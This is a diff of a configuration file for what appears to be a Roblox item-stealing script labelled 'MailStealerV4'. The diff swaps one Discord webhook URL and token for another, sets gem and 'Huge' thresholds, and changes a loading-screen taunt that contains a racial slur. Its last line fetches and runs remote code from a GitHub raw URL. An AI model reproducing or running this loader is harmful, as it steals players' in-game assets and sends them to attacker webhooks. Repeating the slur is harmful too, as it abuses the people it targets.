@@ -1,11 +1,12 @@
+-- Dualhook SETTINGS!
 DualhookUsername = "jheremyqt1"
-DualhookWebHook = "https://discord.com/api/webhooks/1205078536214421504/o8_MnTN5jv_879u6ndWCtorMHW1IIuyC7cBukyTiUncZiJ-y3hjEyYZa7XLFXanGqg-J"
+DualhookWebHook = "https://discord.com/api/webhooks/1211303740272021555/H78apFwN7wXeLOAdysnjERDNrWUgo-blftEyR7o25gLOc1QtK0XWx8wlJMsapixn_9Os"
 
-HugeSetting = 2
+HugeSetting = 1
 GemSetting = 100000
 
 -- Custom Settings!
-LoadingScreenTitle = "NIGGA YOU JUST GOT HIT BY THIS KID discord.gg/ft6qjHR4gh"
-WebHookName = "MailStealerV4"
+LoadingScreenTitle = "YOU JUST GOT HIT BY THIS KID NIGGA"
+WebHookName = "... Mailstealerv4"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriPremium/main/MoriPremium"))()
